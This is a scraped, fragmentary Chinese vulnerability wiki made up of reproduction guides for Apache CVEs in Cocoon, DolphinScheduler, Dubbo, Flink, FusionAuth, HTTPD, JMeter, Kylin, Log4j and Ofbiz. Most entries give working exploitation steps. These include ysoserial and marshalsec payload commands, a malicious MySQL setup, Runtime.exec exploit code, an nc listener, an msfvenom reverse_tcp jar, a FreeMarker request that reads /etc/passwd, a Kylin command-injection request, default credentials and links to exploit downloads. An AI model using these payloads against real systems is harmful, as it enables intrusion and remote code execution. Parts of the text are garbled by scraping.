等待返回shellApacheAxis1.4远程代码执行/media/rId28.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:43 "},"Web安全/Apache Cocoon XML/（CVE-2020-11991）Apache Cocoon XML 外部实体注入漏洞/（CVE-2020-11991）Apache Cocoon XML 外部实体注入漏洞.html":{"url":"Web安全/Apache Cocoon XML/（CVE-2020-11991）Apache Cocoon XML 外部实体注入漏洞/（CVE-2020-11991）Apache Cocoon XML 外部实体注入漏洞.html","title":"（CVE-2020-11991）Apache Cocoon XML 外部实体注入漏洞","keywords":"","body":"（CVE-2020-11991）Apache Cocoon XML 外部实体注入漏洞 一、漏洞简介 Apache Cocoon 是一个基于 Spring 框架的围绕分离理念建立的构架，在这种框架下的所有处理都被预先定义好的处理组件线性连接起来，能够将输入和产生的输出按照流水线顺序处理。用户群：Apache Lenya、Daisy CMS、Hippo CMS、Mindquarry等等，Apache Cocoon 通常被作为一个数据抽取、转换、加载工具或者是系统之间传输数据的中转站。CVE-2020-11991 与 StreamGenerator 有关，在使用 StreamGenerator 时，代码将解析用户提供的 xml。攻击者可以使用包括外部系统实体在内的特制 xml 来访问服务器系统上的任何文件。 二、漏洞影响 Apache Cocoon \\ 三、复现过程 以下是apache社区官方提供利用方式： ]> John &ent; 与普通XXE并无差别，向/v2/api/product/manger/getInfo位置POST构造好的xml数据即可 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:44 "},"Web安全/Apache DolphinScheduler/（CVE-2020-11974）Apache DolphinScheduler 远程代码执行漏洞/（CVE-2020-11974）Apache DolphinScheduler 远程代码执行漏洞.html":{"url":"Web安全/Apache DolphinScheduler/（CVE-2020-11974）Apache DolphinScheduler 远程代码执行漏洞/（CVE-2020-11974）Apache DolphinScheduler 远程代码执行漏洞.html","title":"（CVE-2020-11974）Apache DolphinScheduler 远程代码执行漏洞","keywords":"","body":"（CVE-2020-11974）Apache DolphinScheduler 远程代码执行漏洞 一、漏洞简介 CVE-2020-11974与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc connect参数输入{“detectCustomCollations”:true，“ autoDeserialize”:true} 即可在DolphinScheduler 服务器上远程执行代码 二、漏洞影响 Apache DolphinScheduler = 1.2.0、1.2.1 三、复现过程 漏洞分析 看到这个poc的时候 {\"detectCustomCollations\":true,\"autoDeserialize\":true,\"serverTimezone\":\"UTC\"} 其实我第一反应就是2019年的blackhat的那个利用但我又不太确定，直到我按照其他师傅复现的19年的blackhat的那个漏洞利用方式来复现成功，仔细分析了一波。我们先看这个创建数据库的接口。当我们点击create之后 ApacheDolphinScheduler远程代码执行漏洞/media/rId25.png) 进入该controller ApacheDolphinScheduler远程代码执行漏洞/media/rId26.png) 并调用service层的createDataSource方法 ApacheDolphinScheduler远程代码执行漏洞/media/rId27.png) 最终调用DriverManager.getConnection进行连接数据库 ApacheDolphinScheduler远程代码执行漏洞/media/rId28.png) 我把这段代码拿出来，有没有很熟悉 connection = DriverManager.getConnection(datasource.getJdbcUrl(), datasource.getUser(), datasource.getPassword()); ApacheDolphinScheduler远程代码执行漏洞/media/rId29.png) （其实也可以直接用其他师傅之前写的Fake_Mysql_Server，我这边就不再去试了。）分析到这里还不够，我们回来看看这个Mysql Connector/j的版本号 5.1.34符合其他师傅复现的那个洞的版本号 ApacheDolphinScheduler远程代码执行漏洞/media/rId30.png) 除此以外，发现yso的利用链跟commons-collections的版本号也是3.2.2也不符合，一开始想着去寻找其他的利用链路，后来参考了下fnmsd师傅的文章发现，已经找到了利用链，那就是直接复现这个洞就好了 ApacheDolphinScheduler远程代码执行漏洞/media/rId31.png) 跟进 DriverManager.getConnection，继续接着上面的连接分析，而当detectCustomCollations设置为true的时候com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor ApacheDolphinScheduler远程代码执行漏洞/media/rId32.png) 跟进后 ApacheDolphinScheduler远程代码执行漏洞/media/rId33.png) 最终进入到getObject ApacheDolphinScheduler远程代码执行漏洞/media/rId34.png) 最终反序列化我们传入的payload ApacheDolphinScheduler远程代码执行漏洞/media/rId35.png) 漏洞复现 配置mysql 1. 安装rewrite插件 以下安装方式任选其一 【任选】编译插件 下载mysql-5.7.28源码到/root/mysql-5.7.28，https://launchpadlibrarian.net/451650638/mysql-5.7_5.7.28.orig.tar.gz gcc -shared -Wall -fPIC -o /usr/lib/mysql/plugin/rewrite_example.so rewrite_example.cc -I/root/mysql-5.7.28/include $(mysql_config --cflags) $(mysql_config --libmysqld-libs) -DMYSQL_DYNAMIC_PLUGIN -lmysqlservices 【任选】直接使用本git仓库中的rewrite_example.so 复制rewrite_example.so到/usr/lib/mysql/plugin/rewrite_example.so即可。 rewrite_example.so在Ubuntu16.04编译，如安装时出现问题请自行编译。 2. 安装插件，建表，插入二进制数据 安装插件 INSTALL PLUGIN rewrite_example SONAME 'rewrite_example.so'; 建表 创建数据库：codeplutos，请自行创建 建表sql如下 SET NAMES utf8mb4; SET FOREIGN_KEY_CHECKS = 0; -- ---------------------------- -- Table structure for payload -- ---------------------------- DROP TABLE IF EXISTS `payload`; CREATE TABLE `payload` ( `COLLATION_NAME` varchar(255) DEFAULT NULL, `CHARACTER_SET_NAME` blob, `ID` int(5) DEFAULT NULL, `IS_DEFAULT` varchar(255) DEFAULT NULL, `IS_COMPILED` varchar(255) DEFAULT NULL, `SORTLEN` int(5) DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- ---------------------------- -- Records of payload -- ---------------------------- BEGIN; INSERT INTO `payload` VALUES ('1big5_chinese_ci', 0x01, 1, 'Yes', 'Yes', 1); COMMIT; SET FOREIGN_KEY_CHECKS = 1; 生成payload 首先ysoserial生成payload（我这里直接用fnmsd师傅改的改的ysoserial.jar) java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRE8u20 \"touch /tmp/1.txt\" > t touch /tmp/1.txt 这个替换成自己想要执行的命令，在同个目录下用这个py脚本进行转码生成payload字符 import os import binascii with open(\"t\", 'rb') as f: payload_content = str(binascii.b2a_hex(f.read())) print payload_content ApacheDolphinScheduler远程代码执行漏洞/media/rId41.png) 写入数据库 set @a=0x这里修改为你的payload； update codeplutos.payload set character_set_name = @a; 默认用户名密码登陆 admin/dolphinscheduler123 ApacheDolphinScheduler远程代码执行漏洞/media/rId42.png) 点击添加数据库 ApacheDolphinScheduler远程代码执行漏洞/media/rId43.png) 填入信息，点击create（而不是connect，我在这里踩过坑） ApacheDolphinScheduler远程代码执行漏洞/media/rId44.png) 复现成功，创建了一个1.txt ApacheDolphinScheduler远程代码执行漏洞/media/rId45.png) 上述中的poc下载地址 https://download.0-sec.org/Web安全/Apache DolphinScheduler/CVE-2020-11974/DolphinschedulerExploit-master.zip 参考链接 https://xz.aliyun.com/t/8304 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:45 "},"Web安全/Apache Dubbo/（CVE-2019-17564）Apache Dubbo 反序列化漏洞/（CVE-2019-17564）Apache Dubbo 反序列化漏洞.html":{"url":"Web安全/Apache Dubbo/（CVE-2019-17564）Apache Dubbo 反序列化漏洞/（CVE-2019-17564）Apache Dubbo 反序列化漏洞.html","title":"（CVE-2019-17564）Apache Dubbo 反序列化漏洞","keywords":"","body":"（CVE-2019-17564）Apache Dubbo 反序列化漏洞 一、漏洞简介 Apache Dubbo支持多种协议，推荐官方使用Dubbo协议。Apache Dubbo HTTP协议中的一个反序列化漏洞（CVE-2019-17564），漏洞该主要原因的在于当Apache Dubbo启用HTTP协议之后，Apache Dubbo对消息体处理不当导致不安全反序列化，当项目包中存在可用的gadgets时即可导致远程代码执行。 二、漏洞影响 2.7.0 \\ 三、复现过程 1.环境建设 为了环境搭建方便，访问dubbo-samples的github项目主页（https://github.com/apache/dubbo-samples） 下载源码以后，分离出http部分 ApacheDubbo反序列化漏洞/media/rId24.png) 修改pom.xml中32行dubbo.version ApacheDubbo反序列化漏洞/media/rId25.png) 修改其为漏洞版本,以2.7.3为例,随后在Idea中开启即可修改JDK版本为1.8 ApacheDubbo反序列化漏洞/media/rId26.png) 随后导入一个可控的gadgets用于分析,例如commons-collections4-4.0,并启动HttpProvider ApacheDubbo反序列化漏洞/media/rId27.png) 注:Dubbo启动依赖zookeeper,这部分使用不再赘述,请自行查阅google 2.漏洞分析 我们进入org.apache.dubbo.remoting.http.servlet.DispatcherServlet在43行handler.handle(request, response);处打入断点，利用burp进行发包跟踪它的走向 ApacheDubbo反序列化漏洞/media/rId29.png) 随后发现其进入org.apache.dubbo.rpc.protocol.http.HttpProtocol中的handle ApacheDubbo反序列化漏洞/media/rId30.png) 进一步跟踪 ApacheDubbo反序列化漏洞/media/rId31.png) 最终进入org.springframework.remoting.rmi.RemoteInvocationSerializingExporter ApacheDubbo反序列化漏洞/media/rId32.png) 该ois对象来源为报文中post data部分,对于传入的ois并没有做任何安全过滤和检查,直接就行了readObject方法导致RCE产生. ApacheDubbo反序列化漏洞/media/rId33.png) 很多人不太理解Java反序列化漏洞怎么rce,这里给出一段示例代码 使用ysoserial随意生成一个序列化文件,再利用下面的代码读取该序列化文件即可达到效果,可见直接使用readObject方法的危害 import java.io.FileInputStream; import java.io.ObjectInputStream; public class test1 { public test1() { } public static void main(String[] args) throws Exception { FileInputStream fis = new FileInputStream(\"/Users/xue/Documents/NetSafe/Tools/JavaTools/1.ser\"); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); } } 3.漏洞复现 ysoserial下载地址：http://wiki.0-sec.org/download/ysoserial.zip 利用ysoserial生成payload java -jar ysoserial-master-30099844c6-1.jar CommonsCollections4 \"calc\" > payload.out 将payload粘贴至burp中 ApacheDubbo反序列化漏洞/media/rId34.png) ApacheDubbo反序列化漏洞/media/rId35.gif) 参考链接 https://qiita.com/shimizukawasaki/items/39c9695d439768cfaeb5 https://www.cnblogs.com/wh4am1/p/12307848.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:52 "},"Web安全/Apache Dubbo/（CVE-2020-1948）Apache Dubbo Hessian 反序列化漏洞/（CVE-2020-1948）Apache Dubbo Hessian 反序列化漏洞.html":{"url":"Web安全/Apache Dubbo/（CVE-2020-1948）Apache Dubbo Hessian 反序列化漏洞/（CVE-2020-1948）Apache Dubbo Hessian 反序列化漏洞.html","title":"（CVE-2020-1948）Apache Dubbo Hessian 反序列化漏洞","keywords":"","body":"（CVE-2020-1948）Apache Dubbo Hessian 反序列化漏洞 一、漏洞简介 攻击者可以发送带有无法识别的服务名或方法名及某些恶意参数负载的RPC请求，当恶意参数被反序列化时将导致代码执行 二、漏洞影响 2.7.0 \\ 2.6.0 \\ Apache Dubbo 全部 2.5.x 版本 三、复现过程 漏洞分析 Hessian是一个轻量级的RPC框架。它基于HTTP协议传输，使用Hessian二进制序列化，对于数据包比较大的情况比较友好。使用hession的web项目需要配置web.xml,映射com.caucho.hessian.server.HessianServlet之相应的路径 ApacheDubboHessian反序列化漏洞/media/rId25.png) Java客户端可以很方便的调用服务器上的方法,如下 ApacheDubboHessian反序列化漏洞/media/rId26.png) 查看com.caucho.hessian.server.HessianServlet的代码service方法处理客户端发来的http请求,调用 ApacheDubboHessian反序列化漏洞/media/rId27.png) ApacheDubboHessian反序列化漏洞/media/rId28.png) 调用HessianSkeleton的invoke方法,将从客户端发来的数据流中读取对象 ApacheDubboHessian反序列化漏洞/media/rId29.png) 看代码里面好像没有什么黑白名单过滤机制通过抓取请求包,分析,构造请求包,将marshalsec工具生成的Resion payload发送给服务器下面是构造请求包的CVE-2020-1948.py代码 ApacheDubboHessian反序列化漏洞/media/rId30.png) 利用图 ApacheDubboHessian反序列化漏洞/media/rId31.png) ApacheDubboHessian反序列化漏洞/media/rId32.png) 漏洞复现 构造poc ## exp.java import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.util.Hashtable; public class exp { public exp(){ try { java.lang.Runtime.getRuntime().exec(\"calc.exe\"); } catch (java.io.IOException e) { e.printStackTrace(); } } } 编译poc javac exp.java nc监听 nc -lvvp 12345 服务器开启web服务，并将生成好的exp.class放置web目录 启动 LDAP 代理服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://www.0-sec.org/#exp 81 marshalsec 下载： https://download.0-sec.org/Web安全/java反序列化漏洞/marshalsec-0.0.3-SNAPSHOT-all.jar py脚本测试 安装依赖包 pip install dubbo-py 运行 python poc.py www.target.com 12345 ldap://www.yourweb:81/exp 除了通过返回信息来判断外，观察 LDAP 代理是否出现请求转发也是判断POC利用是否成功的重要依据: # LDAP Refer Server Output Send LDAP reference result for exp redirecting to http://www.0-sec.org/exp.class # poc.py # -*- coding: utf-8 -*- import sys from dubbo.codec.hessian2 import Decoder,new_object from dubbo.client import DubboClient if len(sys.argv) 参考链接 https://github.com/DSO-Lab/Dubbo-CVE-2020-1948/wiki Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:55 "},"Web安全/Apache Flink/Apache Flink Dashboard 未授权访问-远程代码命令执行/Apache Flink Dashboard 未授权访问-远程代码命令执行.html":{"url":"Web安全/Apache Flink/Apache Flink Dashboard 未授权访问-远程代码命令执行/Apache Flink Dashboard 未授权访问-远程代码命令执行.html","title":"Apache Flink Dashboard 未授权访问-远程代码命令执行","keywords":"","body":"Apache Flink Dashboard 未授权访问-远程代码命令执行 一、漏洞简介 Apache Flink的任意Jar包上传导致远程代码执行的漏洞 二、漏洞影响 \\ 三、复现过程 1、 msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.20.166 LPORT=8989 -f jar > rce.jar 2、 上传alewong Jar包 批量脚本 https://github.com/ianxtianxt/Apache-Flink-Dashboard-rec Ps: 当注释掉 if 'Unable to load requested file' in str(data): 之后，出现Token为空，或者 Unauthorized request 时候是不存在未授权访问的，而是带授权 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:58 "},"Web安全/Apache FusionAuth/（CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞/（CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞.html":{"url":"Web安全/Apache FusionAuth/（CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞/（CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞.html","title":"（CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞","keywords":"","body":"（CVE-2020-7799） Apache FreeMarker模板FusionAuth远程代码执行漏洞 一、漏洞简介 在FusionAuth 1.11.0版本之前的中发现了一个问题。经过身份验证的用户允许编辑电子邮件模板（主页->设置->电子邮件模板）或主题（主页->设置->主题），可利用freemarker.template.utility.Execute执行任意命令 二、漏洞影响 三、复现过程 post提交 POST /ajax/email/template/preview HTTP/1.1 Host: www.0-sec.org:9011 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: */* Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 796 DNT: 1 Connection: close Referer: http://192.168.0.3:9011/admin/email/template/edit/2c2591f5-2136-4a77-8b5a-1f5e9fb0e25b Cookie: JSESSIONID=FA9DB3CBABA6B37E5336AE4B96001807; primeCSRFToken=kRC228UjAA4ohN_E9PW9kz0HpTlxUDCB_HVrDhBUfWU&emailTemplateId=2c2591f5-2136-4a77-8b5a-1f5e9fb0e25b&emailTemplate.name=COPPA%20Notice&emailTemplate.defaultSubject=Notice%20of%20your%20consent&emailTemplate.fromEmail=no-reply%40fusionauth.io&emailTemplate.defaultFromName=FusionAuth&emailTemplate.defaultTextTemplate=You%20recently%20granted%20your%20child%20consent%20in%20our%20system.%20This%20email%20is%20to%20notify%20you%20of%20this%20consent.%20If%20you%20did%20not%20grant%20this%20consent%20or%20wish%20to%20revoke%20this%20consent%2C%20click%20the%20link%20below%3A%0A%0Ahttp%3A%2F%2Fexample.com%2Fconsent%2Fmanage%0A%0A-%20FusionAuth%20Admin&emailTemplate.defaultHtmlTemplate=${\"freemarker.template.utility.Execute\"?new()(\"cat /etc/passwd\")}} ApacheFreeMarker模板FusionAuth远程代码执行漏洞/media/rId24.png) 批量检测脚本 https://github.com/ianxtianxt/CVE-2020-7799/ 参考链接 https://www.anquanke.com/vul/id/1910928 https://cert.360.cn/warning/detail?id=207275e27a6e7ee85a43a6eb5cf5fc69 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:47:59 "},"Web安全/Apache HTTPD/（CVE-2017-15715）Apache HTTPD 换行解析漏洞/（CVE-2017-15715）Apache HTTPD 换行解析漏洞.html":{"url":"Web安全/Apache HTTPD/（CVE-2017-15715）Apache HTTPD 换行解析漏洞/（CVE-2017-15715）Apache HTTPD 换行解析漏洞.html","title":"（CVE-2017-15715）Apache HTTPD 换行解析漏洞","keywords":"","body":"（CVE-2017-15715）Apache HTTPD 换行解析漏洞 一、漏洞简介 Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 二、漏洞影响 Apache HTTPD 2.4.0~2.4.29 三、复现过程 上传一个名为1.php的文件，被拦截： ApacheHTTPD换行解析漏洞/media/rId24.png) 在1.php后面插入一个\\x0A（注意，不能是\\x0D\\x0A，只能是一个\\x0A），不再拦截： ApacheHTTPD换行解析漏洞/media/rId25.png) 访问刚才上传的/1.php%0a，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞： ApacheHTTPD换行解析漏洞/media/rId26.png) 参考链接 https://vulhub.org/\\#/environments/httpd/CVE-2017-15715/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:01 "},"Web安全/Apache HTTPD/Apache HTTPD 多后缀解析漏洞/Apache HTTPD 多后缀解析漏洞.html":{"url":"Web安全/Apache HTTPD/Apache HTTPD 多后缀解析漏洞/Apache HTTPD 多后缀解析漏洞.html","title":"Apache HTTPD 多后缀解析漏洞","keywords":"","body":"Apache HTTPD 多后缀解析漏洞 一、漏洞简介 Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件： AddType text/html .html AddLanguage zh-CN .cn 其给.html后缀增加了media-type，值为text/html；给.cn后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，他将返回一个中文的html页面。 以上就是Apache多后缀的特性。如果运维人员给.php后缀增加了处理器： AddHandler application/x-httpd-php .php 那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。 //说白了就是文件重命名为xxx.php.jpg就可以被识别成php文件 二、漏洞影响 三、复现过程 首先正常上传一个 xxx.php 文件 这里可以看到上传失败了。我们更改一下文件后缀名 将上传文件命名为 xxx.php.jpg 通过游览器访问上传的\"jpg文件\" Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:00 "},"Web安全/Apache JMeter/（CVE-2018-1297）Apache Jmeter RMI 反序列化命令执行漏洞/（CVE-2018-1297）Apache Jmeter RMI 反序列化命令执行漏洞.html":{"url":"Web安全/Apache JMeter/（CVE-2018-1297）Apache Jmeter RMI 反序列化命令执行漏洞/（CVE-2018-1297）Apache Jmeter RMI 反序列化命令执行漏洞.html","title":"（CVE-2018-1297）Apache Jmeter RMI 反序列化命令执行漏洞","keywords":"","body":"（CVE-2018-1297）Apache Jmeter RMI 反序列化命令执行漏洞 一、漏洞简介 Apache JMeter是美国阿帕奇（Apache）软件基金会的一套使用Java语言编写的用于压力测试和性能测试的开源软件。其2.x版本和3.x版本中存在反序列化漏洞，攻击者可以利用该漏洞在目标服务器上执行任意命令。 二、漏洞影响 Apache JMeter 2.x版本Apache JMeter 3.x版本 三、复现过程 直接使用ysoserial即可进行利用： java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit ip 1099 BeanShell1 'touch /tmp/success' 我们使用的是BeanShell1这条利用链。使用docker-compose exec jmeter bash进入容器，/tmp/success已成功创建： 反弹shell即可 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:02 "},"Web安全/Apache Kylin/（CVE-2020-1956）Apache Kylin 远程命令执行漏洞/（CVE-2020-1956）Apache Kylin 远程命令执行漏洞.html":{"url":"Web安全/Apache Kylin/（CVE-2020-1956）Apache Kylin 远程命令执行漏洞/（CVE-2020-1956）Apache Kylin 远程命令执行漏洞.html","title":"（CVE-2020-1956）Apache Kylin 远程命令执行漏洞","keywords":"","body":"（CVE-2020-1956）Apache Kylin 远程命令执行漏洞 一、漏洞简介 二、漏洞影响 Kylin 2.3.0 - 2.3.2Kylin 2.4.0 - 2.4.1Kylin 2.5.0 - 2.5.2Kylin 2.6.0 - 2.6.5Kylin 3.0.0-alpha, Kylin 3.0.0-alpha2, Kylin 3.0.0-beta, Kylin 3.0.0, Kylin3.0.1 三、复现过程 漏洞分析 在两条commit记录 KYLIN-4426 Refine CliCommandExecutor KYLIN-4426 CliCommandExecutor 可以看到动刀子的位置，应该就是漏洞点的命令执行了，CubeService 应该就是命令执行的地方了，然后在 CliCommandExecutor.checkParameterWhiteList 做了一些处理。1.png 2.png 所以根据CubeController，就能找到对应路由了3.jpeg 当然在命令执行的地方触发之前，有几个值判断，因此需要加上这几个东西。4.png Copy to clipboardkylin.tool.auto-migrate-cube.enabled=true kylin.tool.auto-migrate-cube.src-config=/home/admin/apache-kylin-3.0.1-bin-hbase1x kylin.tool.auto-migrate-cube.dest-config=/tmp/kylin.properties 漏洞复现 POST /kylin/api/cubes/kylin_sales_cube/aaa&touch%20l1nk31&/migrate HTTP/1.1 Host: www.0-sec.org:7070 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Cache-Control: no-cache Pragma: no-cache Authorization: Basic QURNSU46S1lMSU4= Connection: close Referer: http://127.0.0.1:7070/kylin/admin Cookie: project=null; JSESSIONID=2B1DC2A8566558EFF0E6BD91E5BD630E; _ga=GA1.1.636880978.1585905453; rdt_uuid=22a7eaa3-24d1-441a-b4fd-2f87dfe0197f; _fbp=fb.3.1585905456831.913087212 Content-Type: application/x-www-form-urlencoded Content-Length: 11 project=aaa 5.png Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:02 "},"Web安全/Apache Log4j/（CVE-2017-5645）Log4j 2.X反序列化漏洞/（CVE-2017-5645）Log4j 2.X反序列化漏洞.html":{"url":"Web安全/Apache Log4j/（CVE-2017-5645）Log4j 2.X反序列化漏洞/（CVE-2017-5645）Log4j 2.X反序列化漏洞.html","title":"（CVE-2017-5645）Log4j 2.X反序列化漏洞","keywords":"","body":"（CVE-2017-5645）Log4j 2.X反序列化漏洞 一、漏洞简介 二、漏洞影响 Log4j 2.x\\ 三、复现过程 漏洞分析 漏洞本质和上面是一样的，我们先创建如下 Demo 代码用于测试。 Log4j2.X反序列化漏洞/media/rId25.png) // src/main/java/Log4jSocketServer.java import org.apache.logging.log4j.core.net.server.ObjectInputStreamLogEventBridge; import org.apache.logging.log4j.core.net.server.TcpSocketServer; import java.io.IOException; import java.io.ObjectInputStream; public class Log4jSocketServer { public static void main(String[] args){ TcpSocketServer myServer = null; try{ myServer = new TcpSocketServer(8888, new ObjectInputStreamLogEventBridge()); } catch(IOException e){ e.printStackTrace(); } myServer.run(); } } 4.0.0 org.example log4j-2.x-rce 1.0-SNAPSHOT org.apache.logging.log4j log4j-core 2.8.1 org.apache.logging.log4j log4j-api 2.8.1 commons-collections commons-collections 3.1 当我们运行代码后，程序会在本地的 8888 端口开始等待接收数据，然后在下图第105行代码处，将接收到的数据转换成 ObjectInputStream 对象数据，最终在 handler.start() 中调用 SocketHandler 类的 run 方法。 Log4j2.X反序列化漏洞/media/rId26.png) 在 SocketHandler 类的 run 方法中， ObjectInputStream 对象数据被传入了 ObjectInputStreamLogEventBridge 类的 logEvents 方法，而反序列化就发生在这个方法中。 Log4j2.X反序列化漏洞/media/rId27.png) 同样这里我们添加一条 commons-collections 的 Gadget 链用来演示命令执行。 Log4j2.X反序列化漏洞/media/rId28.gif) 参考链接 https://mochazz.github.io/2019/12/26/Log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/\\#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:02 "},"Web安全/Apache Log4j/（CVE-2019-17571）Log4j 1.2.X反序列化漏洞/（CVE-2019-17571）Log4j 1.2.X反序列化漏洞.html":{"url":"Web安全/Apache Log4j/（CVE-2019-17571）Log4j 1.2.X反序列化漏洞/（CVE-2019-17571）Log4j 1.2.X反序列化漏洞.html","title":"（CVE-2019-17571）Log4j 1.2.X反序列化漏洞","keywords":"","body":"（CVE-2019-17571）Log4j 1.2.X反序列化漏洞 一、漏洞简介 二、漏洞影响 Apache Log4j \\ Apache Log4j的1.X版本官方在2015年8月已停止维护 三、复现过程 漏洞分析 其实这个漏洞非常简单，本质就是对从 socket 流中获取的数据没有进行过滤，而直接反序列化。如果当前环境中存在可利用的反序列化 Gadget 链，就可以达到命令执行等效果。我们可以创建如下 Demo 代码用于测试。 Log4j1.2.X反序列化漏洞/media/rId25.png) // src/SocketDeserializeDemo.java import org.apache.log4j.net.SimpleSocketServer; public class SocketDeserializeDemo { public static void main(String[] args){ System.out.println(\"INFO: Log4j Listening on port 8888\"); String[] arguments = {\"8888\", (new SocketDeserializeDemo()).getClass().getClassLoader().getResource(\"log4j.properties\").getPath()}; SimpleSocketServer.main(arguments); System.out.println(\"INFO: Log4j output successfuly.\"); } } # src/resources/log4j.properties log4j.rootCategory=DEBUG,stdout log4j.appender.stdout=org.apache.log4j.ConsoleAppender log4j.appender.stdout.layout=org.apache.log4j.PatternLayout log4j.appender.stdout.threshold=DEBUG log4j.appender.stdout.layout.ConversionPattern=[%d{yyy-MM-dd HH:mm:ss,SSS}]-[%p]-[MSG!:%m]-[%c\\:%L]%n 我们跟进 SimpleSocketServer 的 main 方法，发现其中调用了 SocketNode 类，具体代码如下。 Log4j1.2.X反序列化漏洞/media/rId26.png) 如下图， SocketNode 类实现了 Runnable 接口，其构造方法从 socket 流中获取了数据，并将数据封装为一个 ObjectInputStream 对象。然后在其 run 方法中调用了 readObject 方法进行反序列化操作。由于这里没有对数据进行过滤，所以这里就出现了反序列化漏洞。 Log4j1.2.X反序列化漏洞/media/rId27.png) 这里我们添加一条 commons-collections 的 Gadget 链用来演示命令执行。 Log4j1.2.X反序列化漏洞/media/rId28.gif) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:48:04 "},"Web安全/Apache Ofbiz/（CVE-2020-9496）Apache Ofbiz 远程命令执行漏洞/（CVE-2020-9496）Apache Ofbiz 远程命令执行漏洞.html":{"url":"Web安全/Apache Ofbiz/（CVE-2020-9496）Apache Ofbiz 远程命令执行漏洞/（CVE-2020-9496）Apache Ofbiz 远程命令执行漏洞.html","title":"（CVE-2020-9496）Apache Ofbiz 远程命令执行漏洞","keywords":"","body":"（CVE-2020-9496）Apache Ofbiz \\ 一、漏洞简介 Apache ofbiz存在反序列化漏洞，攻击者通过访问未授权接口，构造特定的xmlrpc http请求可以造成远程代码执行的影响 二、漏洞影响 Apache Ofbiz \\ 三、复现过程 判断是否存在漏洞 22 22 c2hhZG93c29jazU= ApacheOfbiz远程命令执行漏洞/media/rId25.png) 发现响应 Failed to read result object: invalid stream header: 73686164 说明服务端已经将base64解码了，然后尝试读取对象，但是由于我们的是字符串，所以出错了，证明这里就是反序列化的payload所在。 漏洞分析 漏洞信息：https://securitylab.github.com/advisories/GHSL-2020-069-apache\\_ofbiz 补丁：https://github.com/apache/ofbiz-framework/commit/4bdfb54ffb6e05215dd826ca2902c3e31420287a ApacheOfbiz远程命令执行漏洞/media/rId27.png) 根据补丁发现framework\\webtools\\webapp\\webtools\\WEB-INF\\controller.xml中的xmlrpc请求增加了的认证，说明默认情况下该接口访问无需认证 调用方法 直接构造post请求发送 POST /webtools/control/xmlrpc HTTP/1.1 Host: www.0-sec.org:8443 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/xml Content-Length: 181 testMethod test 发现报错org.apache.xmlrpc.server.XmlRpcNoSuchHandlerException: No such service [testMethod]说明没有相关的方法 下断点调试一下，由上面的org.apache.ofbiz.webapp.event.XmlRpcEventHandler#invoke()进入execute()，接着调用org.apache.xmlrpc.server.XmlRpcServer#execute() ApacheOfbiz远程命令执行漏洞/media/rId28.png) 跟入XmlRpcServer#execute()，发现调用了org.apache.xmlrpc.server.XmlRpcServerWorker#execute()，由具体的event handler处理XML-RPC请求 ApacheOfbiz远程命令执行漏洞/media/rId29.png) 在org.apache.ofbiz.webapp.event.XmlRpcEventHandler.ServiceRpcHandler#getHandler()中获取Handler对应的ModelService，默认注册的service有3000多个，也就是可供调用的methodName，如果找不到service会抛出No such service的异常 ApacheOfbiz远程命令执行漏洞/media/rId30.png) 